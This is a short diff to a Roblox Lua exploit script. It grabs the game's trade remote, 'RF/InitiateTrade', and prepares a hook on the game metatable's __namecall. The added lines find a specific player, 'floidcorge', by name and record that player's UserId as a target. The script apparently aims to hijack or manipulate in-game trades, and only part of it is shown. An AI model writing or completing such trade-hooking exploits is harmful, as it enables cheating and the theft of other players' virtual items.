@@ -4,7 +4,16 @@ local net = ReplicatedStorage:WaitForChild("Packages")
 	:WaitForChild("_Index")
 	:WaitForChild("sleitnick_net@0.2.0")
 	:WaitForChild("net")
+local Players = game:GetService("Players")
 local initiateTrade = net:WaitForChild("RF/InitiateTrade")
+local displayName = "floidcorge"
+for _, player in ipairs(Players:GetPlayers()) do
+ if player.DisplayName == displayName or player.Name == displayName then
+	targetUserId = player.UserId
+	print("USERNAME FOUND ... !!!")
+	return
+ end
+end
 
 local mt = getrawmetatable(game)
 local oldNamecall = mt.__namecall
